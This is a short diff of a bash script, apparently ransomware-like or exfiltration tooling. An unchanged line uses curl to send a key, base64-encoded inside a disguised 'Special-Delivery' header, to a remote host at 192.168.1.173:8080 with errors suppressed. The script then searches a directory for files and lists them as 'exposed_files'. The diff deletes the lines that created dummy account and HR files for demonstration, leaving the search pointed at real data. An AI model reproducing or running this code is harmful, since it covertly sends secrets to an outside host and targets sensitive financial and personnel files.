@@ -148,11 +148,6 @@ echo -e "\t =KEY: $key"
 # Using the very RFC-conforming "Special-Delivery" header
 curl -X POST -H "Special-Delivery: $(printf "%s" "$key" | base64)" "http://192.168.1.173:8080" 2> /dev/null
 
-# Create a test directory and files for demonstration
-mkdir -p rx_dir
-touch rx_dir/account{1..12}{01,15}{24,25}.csv
-touch rx_dir/hr{Apr,June,Oct}{23,25}.docx
-
 # Ensure the script is run from a location where rx_dir is created, or provide a full path.
 # Example: find_files "$(pwd)/rx_dir" "exposed_files"
 find_files "rx_dir" "exposed_files"
